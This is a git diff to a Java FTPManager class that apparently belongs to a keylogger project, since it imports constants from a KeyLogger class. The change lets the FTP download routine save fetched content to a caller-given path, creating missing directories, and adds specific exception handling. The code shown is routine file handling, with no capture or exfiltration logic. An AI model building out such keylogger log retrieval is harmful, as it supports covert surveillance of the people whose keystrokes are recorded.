@@ -7,9 +7,13 @@ import static org.dot.KeyLogger.LINE;
 
 import java.io.BufferedOutputStream;
 import java.io.ByteArrayOutputStream;
+import java.io.FileNotFoundException;
 import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.nio.charset.Charset;
+import java.nio.file.AccessDeniedException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
 
 import org.apache.commons.net.ftp.FTP;
 import org.apache.commons.net.ftp.FTPClient;
@@ -39,7 +43,7 @@ public class FTPManager {
 		return ftp.completePendingCommand();
 	}
 	
-	public static boolean download() throws Exception {
+	public static boolean download(String ... args) throws Exception {
 		ByteArrayOutputStream bytes = new ByteArrayOutputStream();
 		OutputStream out = new BufferedOutputStream(bytes);
 		
@@ -49,13 +53,34 @@ public class FTPManager {
 			bytes.close();
 			out.close();
 			String s = bytes.toString("UTF-8");
-			PrintWriter pw = new PrintWriter(LOG_LOCAL);
+			PrintWriter pw;
+			if (args.length > 0) {
+				if (!Files.exists(Paths.get(args[0]))) {
+					String path = "";
+					String[] p = args[0].split("/");
+					for (int i = 0; i < p.length - 1; i++) {
+						path += p[i] + "/";
+					}
+					Files.createDirectories(Paths.get(path));
+					Files.createFile(Paths.get(args[0]));
+				}
+				pw = new PrintWriter(args[0]);
+			} else {
+				pw = new PrintWriter(LOG_LOCAL);
+			}
 			pw.print(s);
 			pw.close();
 			return b;
-		} catch (Exception e) {
+		} catch (FileNotFoundException e) {
+			System.out.println("File not found.");
+		} catch (AccessDeniedException e) {
+			System.out.println("Access denied.");
 			e.printStackTrace();
-		} finally {
+		} catch (Exception e) {
+			System.out.println("This exeption is not handled. Sorry.");
+			e.printStackTrace();
+		}
+		finally {
 			out.close();
 		}
 		return false;
